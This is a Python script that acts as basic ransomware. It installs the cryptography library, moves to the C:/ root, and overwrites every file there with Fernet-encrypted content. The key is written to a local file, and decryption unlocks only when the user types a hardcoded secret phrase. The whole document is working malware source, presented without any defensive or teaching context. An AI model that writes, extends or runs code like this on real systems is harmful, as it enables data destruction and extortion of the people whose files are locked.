import os
import sys
import subprocess

subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography'])

from cryptography.fernet import Fernet

files = []
skip_files = ["full_script.py", "encrypt.exe", "encrypt.key"]

os.chdir("C:/")


def encryption():
    for file in os.listdir():
        if file in skip_files:
            continue
        if os.path.isfile(file):
            files.append(file)

    key = Fernet.generate_key()

    with open("encrypt.key", "wb") as main_key:
        main_key.write(key)

    for file in files:
        if file in skip_files:
            continue
        with open(file, "rb") as encr_file:
            content = encr_file.read()
        encrypted = Fernet(key).encrypt(content)
        with open(file, "wb") as encr_file:
            encr_file.write(encrypted)


def decryption():
    secret = "P455w0rd123!"
    user_input = input("Secret phrase to decrypt your files: ")

    with open("encrypt.key", "rb") as main_key:
        decr_key = main_key.read()

    if user_input == secret:
        for file in os.listdir():
            if file in skip_files or not os.path.isfile(file):
                continue
            with open(file, "rb") as curr_file:
                content = curr_file.read()
            decrypted = Fernet(decr_key).decrypt(content)
            with open(file, "wb") as curr_file:
                curr_file.write(decrypted)

        os.remove("./encrypt.key")


def main():
    option = int(input("1. encrypt\n2. decrypt\nOption: "))

    if option == 1:
        encryption()
    else:
        decryption()

main()